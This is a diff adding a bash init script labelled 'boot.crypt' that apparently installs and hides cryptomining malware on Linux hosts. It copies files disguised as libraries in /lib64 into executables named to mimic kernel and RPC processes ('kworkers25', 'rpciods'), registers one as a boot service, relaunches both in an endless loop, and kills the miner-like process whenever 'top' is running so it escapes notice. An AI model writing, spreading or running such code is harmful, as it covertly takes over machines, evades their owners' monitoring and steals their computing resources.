@@ -1,0 +1,41 @@
+#!/bin/bash
+#chkconfig: 2345 81 96
+#description:boot.crypt
+start(){
+while [ 1 ]
+do
+if [ `ps aux| grep "kworkers25" | grep -v "grep"|wc -l` == 0 ]
+then
+rm -f /lib64/kworkers25 /etc/init.d/kworkers25
+\cp /lib64/libg.a /lib64/kworkers25
+chmod a+x /lib64/kworkers25
+ln -s /usr/lib64/kworkers25 /etc/init.d/kworkers25 -f
+chmod a+x /etc/init.d/kworkers25
+chkconfig --add kworkers25
+chkconfig kworkers25 on
+cd /lib64/
+nohup ./kworkers25 > /dev/null &
+fi
+sleep 1
+if [ ` ps -ef | grep "top" | grep -v "grep"| grep -vi "stop"| grep -vi "desktop"| grep -vi "antop"|wc -l ` != 0 ]
+then
+kill -9 `ps -ef | grep "rpciods" | grep -v "grep" | awk '{print $2}'`
+else
+if [ ` ps -ef | grep "rpciods" | grep -v "grep"|wc -l ` == 0 ]
+then
+cd /usr/sbin/
+rm -f rpciods*
+((numb=$RANDOM%10+$RANDOM%10+$RANDOM%10+$RANDOM%10))
+\cp /lib64/libaio.a /usr/sbin/config.json
+\cp /lib64/liblzma.a /usr/sbin/rpciods$numb
+chmod 777 /usr/sbin/rpciods$numb
+rpciods$numb > /dev/null &
+fi
+fi
+done
+}
+case $1 in
+start):
+    start
+    ;;
+esac
